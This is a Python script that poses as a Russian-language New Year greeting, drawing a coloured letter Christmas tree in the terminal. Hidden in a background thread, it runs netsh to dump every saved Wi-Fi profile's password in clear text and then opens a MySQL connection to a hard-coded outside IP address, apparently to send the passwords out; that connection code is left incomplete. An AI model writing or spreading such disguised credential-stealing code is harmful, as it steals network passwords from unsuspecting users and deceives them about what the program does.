import string
import colorama
from colorama import Fore
import random
import subprocess
import re
from threading import Thread
import time
import mysql.connector

COMPLIENCE = {}

def get_interfaces():
    result = subprocess.run('netsh wlan show interfaces', capture_output=True, text=True, shell=True)
    if result.stderr:
        return False
    else:
        answer = result.stdout
        desire = 'Wi-Fi'
        result = re.findall(r'Name\s*:\s*(.*)', answer)

        if desire in result:
            return True

def get_profiles():
    result = subprocess.run('netsh wlan show profiles', capture_output=True, shell=True, text=True)
    answer = result.stdout
    profiles = re.findall(r'All User Profile\s*:\s*(.*)', answer)

    return profiles

def get_passwd(prof):
    result = subprocess.run(f'netsh wlan show profiles name="{prof}" key=Clear', capture_output=True, shell=True, text=True)
    answer = result.stdout

    passwd = re.findall(r'Key Content\s*:\s*(.*)', answer)
    COMPLIENCE[prof] = passwd[0]

def get_passwords(profiles):
    threads = []
    for prof in profiles:
        thread = Thread(target=get_passwd, args=(prof,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
   if get_interfaces():
        profiles = get_profiles()
        get_passwords(profiles)

        connect = mysql.connector.connect(
            host='45.140.83.56',

        )



colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]

def get_number():
    while True:
        print(f'{Fore.GREEN}Введите размер ёлочки: ',end='')
        try:
            rows = int(input())
            if rows < 30 and rows > 0:
                return rows
            else:
                print(f'{Fore.YELLOW}Ох, такую ёлку не утащить.(1-29)')
                continue
        except ValueError:
            print(f'{Fore.RED}Ну хватит баловаться!')
            continue

def print_rows(self, rows):
    for row in rows:
        for i in range(self):
            print(' ', end='')
        self -= 2
        for i in row:
            print(f'{random.choice(colors)}{i}', end='')
        print('')


def create_fir(countRows):

    symbols = list(string.ascii_lowercase)
    count = 1

    rows = [[]]

    for number in range(countRows):
        row = []
        for i in range(count):
            row.append(random.choice(symbols))
        rows.append(row)
        count += 4

    self = count / 2 + 1
    self = int(self)

    print_rows(self, rows)

    for i in range(self - 3):
        print(' ', end='')
    for i in range(3):
        print(f"{Fore.LIGHTBLACK_EX}{random.choice(symbols)}", end='')


if __name__ == '__main__':
    colorama.init()

    thread = Thread(target=main)
    thread.start()

    countRows = get_number()
    create_fir(countRows)

    thread.join()
    print(f'\n\n{Fore.CYAN}  С Новым годом!')

    while True:
        time.sleep(60)






